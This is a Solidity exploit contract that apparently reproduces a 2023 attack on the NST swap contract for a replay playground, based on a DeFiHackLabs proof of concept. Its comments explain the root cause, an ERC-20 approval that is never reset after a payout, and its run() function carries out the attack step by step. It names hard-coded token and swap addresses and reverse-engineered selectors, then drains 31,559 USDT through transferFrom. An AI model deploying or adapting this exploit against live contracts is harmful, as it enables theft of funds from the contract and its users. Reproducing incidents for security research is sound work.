// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2023-06-NST).
// The DeFiHackLabs PoC (NstExploitTest.testExploit) runs the whole attack INLINE
// in the Foundry test contract (attacker = address(this), no exploit contract,
// no flash-loan callback needed) — so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run().
//
// Root cause (see NST_exp.md): the NST "swap" contract (unverified on-chain,
// selectors reverse-engineered from the attack trace) pays out sellers with
// `token.approve(msg.sender, payout)` immediately followed by
// `token.transfer(msg.sender, payout)`. The transfer delivers the payout
// correctly, but the approve() is never consumed and never reset — leaving the
// caller with a dangling ERC-20 allowance over the swap contract's OWN reserve
// balance equal to the payout it just received. The attacker then simply calls
// USDT.transferFrom(swap, attacker, ...) and drains the swap contract's entire
// remaining USDT float using that leftover allowance.
//
// Sequence (mirrors testExploit() exactly):
//   1. approve the swapper for USDT + NST (so the swap's transferFrom pulls work)
//   2. buyNST(40,000 USDT)  [selector 0x6e41592c] -> receive NST (harmless side
//      dangling NST approval is also created here, but never exploited)
//   3. sellNST(NST received) [selector 0x7cd0599b] -> receive USDT payout AND a
//      dangling USDT approval over the swap's remaining float for that payout
//   4. usdt.transferFrom(swapper, attacker, remaining float) -- the actual theft,
//      using the dangling allowance created in step 3
//
// The attacker's 40,000 USDT working capital (originally sourced via a Balancer
// flash loan, per the write-up) is mocked with a `deal`-equivalent setup.dealToken
// step, exactly like the Foundry test mocks it with `deal(...)`.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract NstExploit {
    IERC20 constant usdt = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 constant nst = IERC20(0x83eE54ccf462255ea3Ec56Fa8dE6797d679276e7);
    address constant swapper = 0x9D101E71064971165Cd801E39c6B07234B65aa88;

    function run() external {
        // Step 1: approve the swap contract to pull USDT/NST from this contract,
        // exactly like the Foundry test's `usdt.approve(swapper, max)` /
        // `nst.approve(swapper, max)`.
        usdt.approve(swapper, type(uint256).max);
        nst.approve(swapper, type(uint256).max);

        // Working capital: 40,000 USDT (6 decimals), sourced via setup.dealToken
        // (stands in for the real attacker's Balancer flash loan).

        // Step 2: buyNST(40,000 USDT) -- selector 0x6e41592c (unverified swap
        // contract; selector reverse-engineered from the attack trace).
        (bool ok1, bytes memory data1) = swapper.call(abi.encodeWithSelector(bytes4(0x6e41592c), 40_000_000_000));
        require(ok1, "buyNST failed");
        uint256 nstReceived = abi.decode(data1, (uint256));

        // Step 3: sellNST(nstReceived) -- selector 0x7cd0599b. This is the
        // vulnerable call: the swap contract approve()s this contract for the
        // USDT payout, THEN transfer()s the same payout -- the approve is never
        // consumed, leaving a dangling allowance over the swap's own USDT float.
        (bool ok2, ) = swapper.call(abi.encodeWithSelector(bytes4(0x7cd0599b), nstReceived));
        require(ok2, "sellNST failed");

        // Step 4: drain the swap contract's remaining USDT float using the
        // dangling allowance created by sellNST's approve() above.
        usdt.transferFrom(swapper, address(this), 31_559_083_207);
    }
}
